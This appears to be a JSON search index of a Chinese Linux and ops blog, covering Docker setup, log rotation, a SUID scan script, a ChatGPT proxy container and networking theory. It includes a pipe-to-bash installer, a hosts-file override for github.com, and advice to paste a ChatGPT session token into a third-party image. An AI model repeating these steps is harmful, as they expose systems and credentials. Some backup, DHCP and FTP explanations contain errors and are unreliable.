src='https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085'></iframe>\n```\n\n也是直接替换掉 src 的内容就可以了。\n\n[**点击这里，查看效果**](https://liuxpblog.eu.org/2023/09/06/TianGang/)\n\n### 嵌入代码\n\n嵌入代码这个功能通常是有别的网站提供的，据我所知大部分视频网站都没有这个功能，YouTube 的嵌入代码做的还可以，哔哩哔哩也有，但是非常吝啬，清晰度非常次，必须要求登录，如果要求登录的话，还不如直接去官网登录观看呢。\n\n![嵌入代码](./blog-add-MM/1.png)\n\n```bash\n<iframe src=\"//player.bilibili.com/player.html?aid=922182547&bvid=BV1Uu4y1u7NQ&cid=1364298943&p=1\" \n        scrolling=\"no\" \n        border=\"0\" \n        frameborder=\"no\" \n        framespacing=\"0\" \n        allowfullscreen=\"true\"> \n</iframe>\n```\n\n效果如下：\n\n<iframe src=\"//player.bilibili.com/player.html?aid=922182547&bvid=BV1Uu4y1u7NQ&cid=1364298943&p=1\" \n        scrolling=\"no\" \n        border=\"0\" \n        frameborder=\"no\" \n        framespacing=\"0\" \n        allowfullscreen=\"true\"> \n</iframe>","tags":["博客美化"],"categories":["博客搭建"]},{"title":"cronolog 实现日志切割","url":"/2023/12/10/cronolog/","content":"\n### 为什么要进行日志切割\n\n日志切割是为了解决日志文件过大导致的一些问题，具体好处如下：\n\n* **控制日志文件大小**： 避免单个日志文件不断增大，占用过多磁盘空间。大日志文件不仅消耗磁盘空间，还可能导致文件系统性能下降。\n\n<!-- more -->\n\n* **方便管理和维护**： 日志切割可以将日志文件按照一定的规则划分成多个较小的文件，便于管理和维护。这样，每个日志文件都包含了特定时间范围或大小的日志，有助于快速定位和查找问题。\n\n* **避免日志文件过大导致的性能问题**： 当一个日志文件变得非常庞大时，对于日志分析工具或其他需要读取该文件的应用，可能会导致性能下降。切割日志文件可以降低读取和处理的负担。\n\n* **支持日志轮转**： 日志切割通常与日志轮转（log rotation）结合使用。日志轮转是指将旧的日志文件备份并可能删除，以便为新的日志文件腾出空间。这有助于保留最近的日志记录，同时控制总体日志文件数量。\n\n* **方便归档和备份**： 切割的日志文件可以更容易地进行归档和备份，因为每个文件的大小和时间范围都是可控的。\n\n* **提高日志的可读性**： 日志切割可以根据需要将日志文件按照不同的标准（例如按天、按大小）进行划分，使得每个文件包含的日志更加具有一致性，提高了日志的可读性和可搜索性。\n\n### 安装 cronolog 工具\n\n1. 下载源码包\n\n```bash\nwget https://files.cnblogs.com/files/crazyzero/cronolog-1.6.2.tar.gz\n```\n\n2. 解压并进入\n\n```bash\ntar -zxvf cronolog-1.6.2.tar.gz\ncd cronolog-1.6.2/\n```\n\n3. 编译安装\n\n```bash\n./configure \nmake\nmake install\n```\n\n4. 验证\n\n```bash\n[root@VM-0-10-centos sbin]# which cronolog\n/usr/local/sbin/cronolog\n```\n\n### 示例\n\n以对 Apache 进行日志切割进行演示，进入 Apache 主配置文件，更改`ErrorLog`和`CustomLog`两个选项。\n\n* 将`ErrorLog \"logs/error_log\"`注释，在下面加上一行\n\n```bash\nErrorLog \"|/usr/local/sbin/cronolog logs/error_%Y%m%d.log\"\n```\n\n效果如下：\n\n![ErrorLog](./cronolog/1.png)\n\n* 将`CustomLog \"logs/access_log\" combined`注释，在下面加上一行\n\n```bash\nCustomLog \"|/usr/local/sbin/cronolog logs/access_%Y%m%d.log\" combined\n```\n\n效果如下：\n\n![ErrorLog](./cronolog/2.png)\n\n### 验证\n\n配置完成之后，使用`httpd -t`检查 Apache 语法，检查无误，使用`apachectl graceful`重新启动服务。\n\n之后在`/var/log/httpd`目录下就可以看到例如 error_20231210.log 这样的 log 文件，然后使用 curl 命令或者浏览器重新访问网站就会自动生成 access_20231210.log 这样的文件。\n\n![ErrorLog](./cronolog/3.png)\n\n### 写在后面的话\n\n以上就可以实现访问日志和错误日志以天为单位进行切割保存，当然 cronolog 也支持按照小时进行切割，在双十一或者春运等特殊日期某访问量突然增多的情况下，可以按照小时进行切割。","tags":["Linux"],"categories":["技术"]},{"title":"docker-compose 安装","url":"/2023/11/03/install-docker-compose/","content":"\n### 在线安装\n\n安装命令在github上，下载起来会很慢，可自行尝试。   \n如果出现`url: (7) Failed to connect to github.com port 443: 拒绝连接`错误，可以通过在`/etc/hosts`文件里添加`140.82.114.3 github.com`条目解决。\n\n```bash\nsudo curl -L \"https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose\n```\n\n<!-- more -->\n\n### 离线安装\n\n如果因为网络问题不能安装的话，可以通过离线安装，在这里提供一个 V2.23.0 版本的包。[**docker-compose-linux-x86_64**](https://pan.baidu.com/s/1QB1o3NeihQoWKZ6q0pG6MQ?pwd=hsu3)，提取码：hsu3。\n\n上传到服务器后，执行以下操作：\n\n```bash\nmv docker-compose-linux-x86_64 /usr/local/bin/docker-compose\nchmod +x /usr/local/bin/docker-compose\ndocker-compose -v\n```\n\n如果看到版本号在，即安装成功。","tags":["Docker"],"categories":["技术"]},{"title":"Docker 如何正确启动 Apache","url":"/2023/11/03/docker-apache/","content":"\n### 问题描述\n\ndocker报错：\nSystem has not been booted with systemd as init system (PID 1). Can‘t operate.\nFailed to connect to bus: Host is down\n\n<!-- more -->\n\n### 解决办法\n\n```bash\n# 运行centos\n# docker run -itd --name centos centos /bin/bash\n\n# 替换为：\n# 获取systemctl权限\ndocker run --privileged -itd --name centos centos /usr/sbin/init\n\n# 进入终端\ndocker exec -it centos /bin/bash\n```","tags":["Docker"],"categories":["技术"]},{"title":"Docker安装及镜像加速","url":"/2023/10/30/DockerInit/","content":"\n### Docker 安装\n\n官方提供了一键安装脚本，直接执行，耐心等待脚本执行完毕即可。\n\n```bash\ncurl -fsSL https://get.docker.com | bash -s docker\n```\n\n<!-- more -->\n\n### 镜像加速\n\n```bash\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.conf <<-'EOF'\n{\n  \"registry-mirrors\": [\"https://az7a5oso.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```","tags":["Docker"],"categories":["技术"]},{"title":"源码安装 fping 命令","url":"/2023/10/14/fping/","content":"\n### 安装步骤\n\n1. 下载源码包\n\n连接网络在线下载\n\n```bash\nwget http://fping.org/dist/fping-3.15.tar.gz\n```\n\n<!-- more -->\n\n或者使用我自己准备好的源码包，目前存放在百度网盘里，[**点击跳转**](https://pan.baidu.com/s/1HF8KQNhvoxPca6ic5m14pg?pwd=ykb6)。\n\n2. 解压源码包\n\n```bash\ntar -xf fping-3.15.tar.gz && cd fping-3.15\n```\n\n3. 执行 configure 脚本检测环境\n\n```bash\n./configure\n```\n\n这一步既可以根据提示信息来按需安装为安装的依赖包，也可以参照我之前的博文[**一键安装源码依赖包**](https://nustarain.gitee.io/2023/10/14/SoucecodeInstallFping/)，进行无脑安装。\n\n4. 最行操作\n\n```bash\nmake && make install\n```\n\n5. 验证安装\n\n```bash\nfping -v\n```","tags":["Linux"],"categories":["小玩意儿"]},{"title":"一键安装源码依赖包","url":"/2023/10/14/SoucecodeInstallFping/","content":"\n在某些条件限制下，经常会遇到源码安装的情况，尤其是对于新的机器来讲，从头梳理源码安装依赖包可是一件头疼的事情，所以整理了一些常见且常用的源码安装依赖包，以备不时之需。\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel libxml2 libxml2-devel\n```\n\n<!-- more -->\n\n如果遇到一些报错信息，可以采用如下命令尝试解决：\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel libxml2 libxml2-devel --allowerasing --nobest\n```","tags":["Linux"],"categories":["小玩意儿"]},{"title":"Apache 与 NGINX 对比","url":"/2023/10/06/Apache-NGINX/","content":"\n### Apache 与 NGINX 各有什么优缺点\n\nApache 同步阻塞式的工作方式，NGINX 异步非阻塞式的工作方式。\n\n<!-- more -->\n\n* Apache 的优点\n\n1. Apache的rewrite功能比nginx的要强大\n2. 找到模块模块非常多，基本想要的功能都能对较少存在时间较长，文献较全，bug也少\n3. 动静态解析都超稳定\n\n* Apache 的缺点\n\n1. 由于工作模式是同步阻塞型，导致资源消耗较高，并发能力较差\n\n* NGINX 的优点\n\n1. 轻量级服务，比Apache占用更少的内存及资源并发能力强，nginx 处理请求是异步非阻塞的，而apache 则是阻塞型的，在高并发下nginx能保持低资源低消耗高性能\n2. 高度模块化的设计，编写模块相对简单\n3. 社区活跃，各种高性能模块产出迅速\n\n* NGINX 的缺点:\n\n1. 动态处理上需要使用fastcgi连接PHP的FPM服务，相比Apache不占优势\n\n总结：\n\nNginx 适合做静态处理，简单，效率高Apache 适合做动态处理，稳定，功能强并发较高的情况下优先选择Nginx，并发要求不高的情况下两者都可以，规模稍大的可以使用Nginx作为反向代理，然后将动态请求负载均衡到后端Apache上。\n\n### 什么是同步与异步\n\n同步:小明收到快递将送达的短信，在楼下一直等到快递送达。\n\n异步:小明收到快递将送达的短信，小明不会下楼去取， 而是快递小哥到楼下后，打电话通知小明，然后小明下楼取快递\n\n### 什么是阻塞与非阻塞\n\n阻塞:小明收到快递即将送达的信息后，什么事都不做，一直专门等快递。\n非阻塞:小明收到快递即将送达的等快递的时候，还一边敲代码信息后，一边听歌，等着快递送达的消息。\n\n### Nginx以异步非阻塞方式工作\n\n客户端发送request，服务器分配work进程来处理能立即处理完的，处理后work进程释放资源，进行下一个request的处理。   \n不能立即处理完的work进程注册返回事件，然后接着去处理其他request。   \n当之前的request结果返回后，触发返回事件，由空闲work进程接着处理通过这种快速处理，快速释放请求的方式，达到同样的配置可以处理更大并发量的目的。","tags":["面试","Linux"],"categories":["理论知识"]},{"title":"Apache 优化着手点","url":"/2023/10/06/Apache-Opt/","content":"\n* 利用Apache自带的 rotatelogs 工具进行日志切割，保证单个日志文件不过大。\n\n```bash\nCustomLog \"| /bin/rotatelogs -l /wwwlogs/access %Y%m%d.log 86400\" combined\n```\n\n<!-- more -->\n\n* 美化错误页面\n\n* 屏蔽Apache版本信息等敏感信息\n\n主要是为了防止对应版本的恶意攻击。\n\n* 配置静态缓存\n\n* 禁止解析 PHP 文件\n\n* 配置 CDN。","tags":["面试","Linux"],"categories":["理论知识"]},{"title":"关于 DNS 的理论知识","url":"/2023/10/06/DNS-server/","content":"\n### DNS 的迭代查询和递归查询\n\n首先来个总结：   \n迭代查询；我不会你不会，你知道谁会，于是你让我去问。   \n递归查询：我不会你不会，你帮我去问，问完回来告诉我。\n\n<!-- more -->\n\n![迭代查询和递归查询](./DNS-server/1.jpg)\n\n知乎一篇文章写的很好，[**点击跳转**](https://zhuanlan.zhihu.com/p/61394192)\n\n### 查询步骤\n\n1. 客户机首先查看本地hosts文件是否有解析记录，有则直接用来访问web server\n2. 没有则向网卡中记录的首选DNS(本地DNS) 发起查询请求\n3. 本地DNS若有记录则返回给客户端，客户端接收到后直接访问web server\n4. 若没有，则本地DNS向根域服务器发起请求，请求解析对应顶级域的IP地址\n5. 本地DNS得到顶级域服务器IP后，再向顶级域服务器发起请求，请求解析权威DNS服务器的IP地址\n6. 本地DNS服务器获取到权威DNS服务器IP地址后，再向其查询具体的完整域名的对\n应解析记录\n7. 最终本地DNS将杏询到的对应域名的解析记录发送给客户端，并在本地记录一份\n\n### 智能 DNS \n\n智能DNS（Intelligent DNS）具有多种功能和优势，它可以为网络管理员、网站运营商和最终用户提供多种服务和增强功能。以下是智能DNS可以实现的一些功能：\n\n1. **负载均衡**：\n- 智能DNS可以分发流量到多个服务器或数据中心，以确保网络负载均衡。这有助于提高网站性能和可用性，避免服务器过载。\n\n2. **地理定位**：\n- 智能DNS可以根据用户的地理位置，将他们定向到最近或最优的服务器。这降低了响应时间，提高了用户体验。\n\n3. **故障转移**：\n- 如果某个服务器或数据中心出现故障，智能DNS可以自动将流量转移到备用服务器，确保连续性和可用性。\n\n4. **内容分发**：\n- 智能DNS可用于构建内容分发网络（CDN），通过将用户定向到最近的CDN节点，加速内容传送，降低延迟，并减少带宽消耗。\n\n5. **安全性**：\n- 智能DNS可以检测和阻止恶意流量，例如分布式拒绝服务攻击（DDoS），并提供防御措施，以确保网络的安全性。\n\n6. **弹性伸缩**：\n- 智能DNS可以根据实际流量负载自动扩展或缩小资源，以适应峰值和低谷时期的需求。\n\n7. **DNS级别的安全性**：\n- 智能DNS可以支持DNSSEC（DNS安全扩展），以保护DNS查询免受潜在的欺骗和中间人攻击。\n\n8. **定制策略**：\n- 智能DNS允许管理员根据自定义策略和需求来定制DNS解析行为，例如按照特定规则路由流量或控制缓存行为。\n\n9. **监控和分析**：\n- 智能DNS通常提供监控和分析功能，允许管理员跟踪流量、性能指标和DNS查询，以进行性能优化和故障排除。\n\n10. **用户体验改进**：\n- 通过提供更快的响应时间、减少延迟和确保高可用性，智能DNS可以改善用户的在线体验。\n\n总之，智能DNS通过利用高级策略和技术，可以优化网络性能、提高可用性、增强安全性，并满足各种网络需求。这些功能使其成为企业、网站运营商和云服务提供商的关键工具，用于管理复杂的网络基础设施。","tags":["面试","网络基础"],"categories":["理论知识"]},{"title":"关于 DHCP 的理论知识","url":"/2023/10/06/DHCP-server/","content":"\n### DHCP工作过程\n\nDHCP（Dynamic Host Configuration Protocol，动态主机配置协议）是一种网络协议，用于自动分配IP地址和其他网络配置信息给连接到网络的计算机和设备。以下是DHCP服务器工作的原理：\n\n<!-- more -->\n\n1. **客户端请求**：\n\n- 当一个计算机或设备加入网络时（例如，通过连接到Wi-Fi网络或通过以太网），它通常需要获取一个可用的IP地址以及其他网络配置信息，如子网掩码、网关和DNS服务器地址。\n- 初始阶段，客户端设备一般没有任何配置信息。\n\n2. **DHCP发现**：\n\n- 客户端设备在网络上广播一个DHCP Discover消息，寻找可用的DHCP服务器。这个消息表明客户端需要一个IP地址以及其他配置信息。\n\n3. **DHCP提供**：\n\n- 在网络中的一个或多个DHCP服务器接收到DHCP Discover消息后，它们可以向客户端发送DHCP Offer消息，其中包含可用的IP地址和其他配置信息。\n- 如果有多个DHCP服务器，客户端可以选择接受其中一个Offer。\n\n4. **DHCP请求**：\n\n- 客户端选择一个DHCP Offer，并向该DHCP服务器发送DHCP Request消息，确认要使用该服务器提供的IP地址和配置信息。\n\n5. **DHCP确认**：\n\n- DHCP服务器接收到客户端的DHCP Request消息后，它会向客户端发送DHCP Acknowledgment（ACK）消息，确认分配的IP地址和配置信息。\n\n6. **配置应用**：\n\n- 客户端设备接收到DHCP ACK消息后，将分配的IP地址和其他配置信息应用到其网络接口上。\n- 客户端设备现在具有了网络连接所需的配置信息，可以正常通信。\n\n7. **租约管理**：\n\n- DHCP服务器通常会分配IP地址和配置信息的租约，即一段时间内，客户端被允许使用分配的IP地址和配置信息。\n- 在租约到期前，客户端可以选择续约，以延长使用分配的IP地址的时间。如果不续约，租约到期后，IP地址将被释放，可以分配给其他设备。\n\n总结：\nDHCP服务器的主要任务是为连接到网络的设备分配IP地址和其他网络配置信息。这样，网络管理员可以轻松管理和配置大量设备，而不需要手动为每个设备分配IP地址。 DHCP协议提供了一种自动化的方式来管理网络地址分配，使网络配置更加灵活和高效。\n\n### 租约与续租\n\n在DHCP（Dynamic Host Configuration Protocol）中，IP地址到期前通常会进行两次续约请求，分别在租约的一半和三分之二的时间点：\n\n1. **第一次续约请求**：\n\n- 发生在租约时间的一半处，即租约的50%时间。例如，如果租约时间为8小时，那么第一次续约请求将在4小时时触发。\n- 客户端会发送DHCP Request消息，请求延长租约的有效期。\n- DHCP服务器可以接受这个请求，并在ACK消息中批准续约，延长租约的有效期。\n- 如果DHCP服务器无法响应或客户端未收到回应，客户端可能会尝试进行第二次续约请求。\n\n2. **第二次续约请求**：\n\n- 发生在租约时间的三分之二处，即租约的66.67%时间。使用上述示例，这将在约5小时20分钟时发生。\n- 类似于第一次续约请求，客户端发送DHCP Request消息，请求续约租约。\n- DHCP服务器再次可以接受这个请求，并在ACK消息中批准续约，延长租约的有效期。\n- 如果DHCP服务器无法响应或客户端未收到回应，客户端可能会尝试再次进行续约请求。\n\n续约请求的目的是确保客户端在租约即将到期时继续使用相同的IP地址，而不会导致IP地址被释放并重新分配给其他设备。通过这种方式，DHCP客户端可以保持网络连接的连续性，而不必在租约到期时重新配置网络设置。这有助于网络的稳定性和可用性。","tags":["面试","网络基础"],"categories":["理论知识"]},{"title":"FTP协议","url":"/2023/10/06/ftp/","content":"\nFTP协议，文件传输协议，file transfer protocol，是网络文件传输协议，用于在网络中传输文件。\n\n<!-- more -->\n\n### 连接建立\n\nFTP协议与别的协议有所差异，FTP协议工作需要两个端口工作，也就是需要在客户端和服务器端建立两个连接，这两个连接分别是：控制连接、数据连接。\n\n控制连接一般使用21端口不变，而数据连接使用的端口是会随着FTP服务器工作模式的不同而改变的。\n\n在客户端和FTP服务器工作时，通常控制连接只会建立一次，在开始时建立连接，在客户端发送`QUIT`指令后断开连接。但是数据连接有可能会建立多次，通常与FTP建立连接时，并不会默认将数据连接也建立，只有当有文件传输的任务时，才会建立数据连接，当文件传输完毕，数据连接又会断开，知道下一个传输任务开始时，再建立数据连接。\n\n### 工作模式\n\nFTP协议有两种工作模式：主动模式和被动模式。这两种模式是讲服务器的主动和被动。\n\n#### 主动模式\n\n在主动模式下，客户端通过控制连接发送`PORT`命令告知服务器自己的IP和打开的端口，之后服务器主动连接客户端，这时服务器使用的就是默认的20端口去建立数据连接。\n\n而客户端使用的`PORT`命令并不是直接告知服务器自己的`IP:PORT`，而是这样的模式`PORT 123,57,54,43,8`，这个命令指定的IP便是`123.57.54.43`，而端口是`2060`，这是需要计算的，公式为`2060=8*256+12`。\n\n主动模式的缺点就是服务器发起的数据连接请求有可能会被客户端的防火墙进行拦截。\n\n#### 被动模式\n\n在被动模式下，客户端通过控制连接发送`PASV`命令告知服务器处于被动模式。服务器收到命令后，会在本地随机开启一个端口，处于监听状态，并通过控制连接告知客户端。客户端便可以通过这个端口与服务器建立数据连接。\n\n所以当FTP服务器处于被动模式的情况下，数据连接的端口便不再是20端口，而是一个随机的端口。\n\n因为连接是通过客户端主机主动发起的，所以数据连接不会被客户端的防火墙拦截。\n\n### 命令\n\n常见的FTP命令：\n- `USER`: 用户名\n- `PASS`: 密码\n- `LIST`: 列出目录\n- `CWD`: 切换目录\n- `CDUP`: 返回上一级目录\n- `RETR`: 下载文件\n- `STOR`: 上传文件\n- `DELE`: 删除文件\n- `MKD`: 创建目录\n- `RMD`: 删除目录\n- `QUIT`: 退出","tags":["面试","网络基础"],"categories":["理论知识"]},{"title":"完整备份、增量备份、差异备份","url":"/2023/10/04/backup-style/","content":"\n备份是一种数据保护策略，它旨在防止数据丢失或恢复已丢失的数据。在备份中，有三种常见的备份类型：完整备份、增量备份和差异备份。以下是对这三种备份类型的详细解释：\n\n<!-- more -->\n\n### 完整备份（Full Backup）\n\n- 完整备份是最基本的备份类型。它会备份所有选定的数据和文件，包括整个文件系统或指定的目录。\n- 第一次完整备份通常需要时间较长，因为它备份了所有数据。\n- 后续的完整备份通常只会备份自上次完整备份以来更改的数据。\n- 完整备份的优点是恢复速度快，因为它包含了所有数据，但缺点是需要更多的存储空间。\n\n### 增量备份（Incremental Backup）\n\n- 增量备份只备份自上次备份以来发生更改的数据。它记录了每个备份的时间点，并备份自上次备份后新添加或修改的文件。\n- 第一次增量备份通常与完整备份相似，备份所有数据。\n- 后续的增量备份只备份自上次增量备份以来更改的数据。\n- 增量备份通常需要较少的存储空间，但在恢复时需要多个备份集合。\n\n### 差异备份（Differential Backup）\n\n- 差异备份备份自上次完整备份以来发生更改的数据，而不是自上次备份以来的所有更改。\n- 第一次差异备份通常与完整备份相似，备份所有数据。\n- 后续的差异备份只备份自上次差异备份以来更改的数据，而不是自上次完整备份以来的所有更改。\n- 差异备份需要较少的存储空间，比完整备份更快，但比增量备份需要更多的存储空间。\n\n### 总结\n- 完整备份备份所有数据，恢复速度快，但需要更多的存储空间。\n- 增量备份备份自上次备份以来的更改，存储空间较少，但需要多个备份集合来恢复。\n- 差异备份备份自上次完整备份以来的更改，存储空间较少，恢复速度相对较快。\n\n选择备份类型取决于存储需求、恢复时间和备份策略。通常，组合使用完整备份和增量或差异备份可以提供有效的数据保护策略。","tags":["面试","存储"],"categories":["理论知识"]},{"title":"为Linux设置一套合理的备份方案","url":"/2023/10/04/linux-backup/","content":"\n倘若服务器没有任何的备份策略，要为它设计一份备份策略，可以从以下的角度进行考虑，分析，着手设计。\n\n<!-- more -->\n\n### 重要系统目录\n\n对于任何服务器来讲都需要注意备份的系统目录：\n\n```bash\n/etc\n/root\n/home\n/var/spool/at\n/var/spool/cron\n/var/spool/mail\n```\n\n### 其他配置目录\n\n其二，要根据服务器的作用来考虑额外需要备份的配置文件。需要注意的一点，在安装软件包时，采取的安装方式不一样，软件包的配置目录也不一样，比如NGINX，采取源码安装，配置路径为`/usr/local/nginx`；RPM包安装的NGINX，配置路径为`/etc/nginx`。清楚配置文件路径的差异，按照实际情况指定备份策略。\n\n除了服务的配置文件，例如Apache服务的**站点内容**和生成的**日志文件**，也要进行备份。\n\n### 备份策略设计\n\n备份方式主要有：完整备份、增量备份、差异备份，可以根据具体的业务需求制定不同的备份策略，满足实际的需要。\n\n关于备份方式的详细介绍，点击链接查看[**完整备份、增量备份、差异备份**](https://nustarain.gitee.io/2023/10/04/backup-style/)详细解读。\n\n### 备份存储位置\n\n1. 离线备份：将备份数据存储在离线介质上，如外部硬盘、磁带或光盘。离线备份可以防止备份数据受到网络攻击或恶意软件的影响。\n\n2. 远程备份：将备份数据存储在物理上分离的远程位置。这有助于防止自然灾害、盗窃或设备故障等情况下的数据丢失。\n\n3. 云备份：使用云存储服务作为备份储存位置，如Amazon S3、Google Cloud Storage、Microsoft Azure Blob Storage等。云备份提供了高可用性和灵活性，并可根据需求进行扩展。\n\n4. 本地备份：将备份数据存储在本地服务器或存储设备上。这提供了快速的数据恢复能力，但需要处理本地存储风险。\n\n最终的备份储存位置设计应根据组织的需求、风险承受能力和预算来确定。通常，采用混合备份策略，结合离线备份、远程备份和云备份，可以提供高级别的数据保护和恢复能力。此外，应定期评估备份策略，以确保其与组织的需求和技术环境保持一致。","tags":["面试","Linux"],"categories":["理论知识"]},{"title":"检测带有 SUID SGID 的文件","url":"/2023/10/01/SUID-SGID/","content":"\n### 背景\n\n在linux中，关于 SUID 和 SGID 这种特殊权限的使用，是非常谨慎的，稍有不慎，便有可能导致权限泄露。所以在工作中，常常需要对系统进行检测，重点关注除了 Linux 系统以外的带有类似 SUID 和 SGID 这种特殊权限的文件。下面是检测带有 SUID 和 SGID 特殊权限位的脚本，方便各位使用。\n\n<!-- more -->\n\n```bash 点击折叠\n#!/bin/bash\n\n# 检查是否提供了目录作为参数\nif [ $# -ne 1 ]; then\n    echo \"用法: $0 <目录路径>\"\n    exit 1\nfi\n\n# 获取要扫描的目录路径\nscan_directory=\"$1\"\n\n# 检查目录是否存在\nif [ ! -d \"$scan_directory\" ]; then\n    echo \"目录不存在: $scan_directory\"\n    exit 1\nfi\n\n# 创建一个存储结果的文件\noutput_file=\"suid_sgid_files.txt\"\ntouch \"$output_file\"\n\n# 搜索并记录SUID和SGID文件\necho \"$(date \"+%F %H:%M\")\" >> \"$output_file\"\necho \"以下是带有SUID和SGID权限的文件和目录：\" >> \"$output_file\"\nfind \"$scan_directory\" -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; >> \"$output_file\" 2>/dev/null\nfind \"$scan_directory\" -type d \\( -perm -4000 -o -perm -2000 \\) -exec ls -ld {} \\; >> \"$output_file\" 2>/dev/null\n\necho \"结果已保存到 $output_file\"\n```","tags":["Linux"],"categories":["小玩意儿"]},{"title":"命令行IP工具","url":"/2023/09/28/ip-tools/","content":"\n### curl 指定 IPv6 或 IPv4 访问\n\n如果同一个 host 同时解析到 IPv6 和 IPv4 地址，即 IPv4/IPv6 双栈，则 curl 使用参数可指定 IP 协议的版本。\n\n```bash\ncurl -4 test.ipw.cn\n106.224.145.147\n\ncurl -6 test.ipw.cn\n2408:824c:200::2b8b:336f:cc9c\n```\n\n<!-- more -->\n\n###  IPV4 OR IPV6 优先？\n\n```bash\ncurl test.ipw.cn\n```\n\nPS：实测验证：这个命令行工具即使返回IPV6也不代表就是IPV6优先了，还是通过网页验证比较靠谱。\n\n打开 [https://test.ipw.cn/](https://test.ipw.cn/)，如果返回的 IPVersion 字段为 IPv6，则当前网络 IPv6 访问优先，如果返回的 IPVersion 字段为 IPv4，则当前网络 IPv4 访问优先。\n\n### 验证IPV6\n\n1. 网页访问验证\n\n这是一个 [IPv6 地址查询](https://ipw.cn/ipv6/) 的网站，可以看到上面提示 您的网络 IPv6 访问优先。\n\n也可以对自己的公网 IPv6 地址进行 [在线 Ping](https://ipw.cn/ipv6ping/)。\n\n2. 域名访问验证\n\n打开 [https://6.ipw.cn/](https://6.ipw.cn/)，如果能访问成功，那么证明 IPv6 网络开启成功。\n\n3. IPv6 地址直接访问\n\n若成功开启IPV6，可以直接成功访问`http://[2402:4e00:1013:e500:0:9671:f018:4947]/`，会返回如下信息。\n\n```bash\n// http://[2402:4e00:1013:e500:0:9671:f018:4947]/\n240e:3b7:3b7:3b7::3b7\n```\n\n","tags":["Windows","工具"],"categories":["小玩意儿"]},{"title":"出现\"An auido error has occurred,player will skip forward in 2 seconds.\"错误！","url":"/2023/09/15/music-API-error/","content":"\n### 问题描述\n\n不知道怎么搞的，前几天刚刚弄好的博客音乐播放器，今天再次打开的时候，播放页面老是在弹出报错“An auido error has occurred,player will skip forward in 2 seconds.”。因为在将歌单放在博客之前，为了防止因为非VIP用户的正常播放，已经将歌单所有的音乐都改成了免费音乐，所以一般不会出现权限的问题，但是还是出现了这个问题，百思不得其解。\n\n<!-- more -->\n\n### 问题探索\n\n再网页用F12审查之后，因为也不是专业的，大概看出是因为API的调用出现了问题。所以在回到之前调用的歌单，我是用的鹅厂音乐，所以大概率是鹅厂的API调用的问题。   \n\n为了验证这个猜想，索性把网抑云的歌单拿来实验了一下，还真成功了。所以原因找到了，但是修改鹅厂的API调用还真的不会，希望大佬可以将错误复现，然后着手解决吧。\n\n[**之前搭建音乐播放器的步骤链接**](https://nustarain.gitee.io/2023/09/07/hexo-music/)","tags":["博客美化"],"categories":["博客搭建"]},{"title":"利用docker搭建本地的chatGPT（已失效）","url":"/2023/09/12/LocalchatGPT/","content":"\n### 写在前面的话\n\n由于docker镜像不再维护，项目被作者转移为另一个项目，所以本教程已过期，最新的教程可以看[**在 VPS 上搭建自己的 chatGPT**]()。\n\n在偶然的机会看到一个不错的项目，可以利用docker搭建一个能在本地跑的chatGPT，速度出奇地快，而且和真实chatGPT的数据是一模一样的，实测很nice，可以搞。\n\n<!-- more -->\n\n### 搭建步骤\n\n1. 自行解决docker环境。\n\n2. 拉取镜像。\n\n```bash\ndocker pull pengzhile/pandora\n```\n\n3. 运行容器。\n\n```bash\ndocker run  -e PANDORA_CLOUD=cloud -e PANDORA_SERVER=0.0.0.0:8899 -p 8899:8899 -d pengzhile/pandora\n```\n\n4. 运行成功就可以在浏览器输入`127.0.0.1:8899`进行访问了。输入自己的chatGPT的账号，就可以正常登录，或者可以通过`token`的方式进行登录。\n\n获取`token`的方法：   \n1. 正常登入到chatGPT的页面。\n2. 点击获取`token`的链接，[**链接在此**](http://chat.openai.com/api/auth/session)\n3. 随后就会出现如下这样的json串，只需要截取箭头位置（括号里）的`token`值即可。\n\n![token](./LocalchatGPT/1.png)\n\n4. 在登录时，选择下方的accesstoken进行登录，然后把token值粘贴进文本框确认即可。\n\n![success](./LocalchatGPT/2.png)\n\n5. 最终的效果图，左边是docker环境下的chatGPT，右边是OpenAI的chatGPT。\n\n![success](./LocalchatGPT/3.png)\n\n---\n\n除此以外，pandora 的作者还搭建了共享的 chatGPT，都是由网友提供的共享的 chatGPT 的账号组成。\n\n怀着敬意地低调使用吧，[**共享的 chatGPT 点击跳转**](https://chat-shared2.zhile.io/shared.html?v=2)","tags":["AI"],"categories":["小玩意儿"]},{"title":"超良心的开源精品软件或项目","url":"/2023/09/10/OpenSourceSofts/","content":"\n本文旨在收集实用、安全、免费、有趣的开源项目或软件。\n\n<!-- more -->\n\n### Windows调优区\n\n* **[Optimizer](https://github.com/hellzerg/optimizer)**\n\n堪称是Windows 系统上最好用的性能优化器！\n\n<p align=\"center\" style=\"width:60%;\">\n   <img src=\"./OpenSourceSofts/5.png\">\n</p>\n\n* **[SophiApp](https://github.com/wangshusen/SearchEngine)**\n\n一款强大的 Windows 微调工具。这是一个用于微调 Windows 10 和 Windows 11 配置的调整器。它拥有现代化的操作界面，在保证系统稳定的前提下，提供了超过 130 种的调整选项。\n\n<p align=\"center\" style=\"width:60%;\">\n   <img src=\"./OpenSourceSofts/6.png\">\n</p>\n\n* **[ExplorerPatcher](https://github.com/valinet/ExplorerPatcher)**\n\n自由切换Windows11 开始菜单样式的工具。这是一款能够让Windows 11 的开始菜单栏(Explorer) 重回Windows 10 样式的扩展工具，除此之外还支持禁用Windows 11 的上下文菜单和命令栏等功能，让你在Windows 上拥有更舒适的工作环境。\n\n* **[memreduct](https://github.com/henrypp/memreduct)**\n\n内存自动优化清理，轻量级实时内存管理应用程序，用于监视和清理计算机上的系统内存。\n\n<p align=\"center\" style=\"width:50%;\">\n\t<img src=\"./OpenSourceSofts/7.png\" />\n</p>\n\n### Windows实用区\n\n* **[Everything](https://www.voidtools.com/zh-cn/)**\n\n本地文件搜索工具，属于本人装机必备的软件。\n\n<p align=\"center\" style=\"width:40%;\">\n\t<img src=\"./OpenSourceSofts/8.png\" />\n</p>\n\n* **[Geek](https://geekuninstaller.com/)**\n\n高效快速、小巧便携。100% 